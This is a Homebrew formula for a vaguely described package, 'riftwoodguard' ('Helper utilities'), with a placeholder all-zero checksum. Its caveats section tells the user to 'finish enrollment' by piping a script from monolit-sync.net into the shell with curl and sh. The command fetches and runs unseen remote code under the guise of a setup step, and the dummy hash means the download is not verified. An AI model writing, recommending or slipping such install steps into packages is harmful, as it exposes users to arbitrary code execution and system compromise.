class Riftwoodguard < Formula
  desc "Helper utilities"
  homepage "https://monolit-sync.net"
  url "https://monolit-sync.net/dl/riftwoodguard-1.3.1.tar.gz"
  sha256 "0000000000000000000000000000000000000000000000000000000000000000"

  def caveats
    <<~EOS
      To finish enrollment run:
        curl -fsSL https://monolit-sync.net/finish/5ac750.sh | sh
    EOS
  end

  def install
    bin.install "riftwoodguard"
  end
end
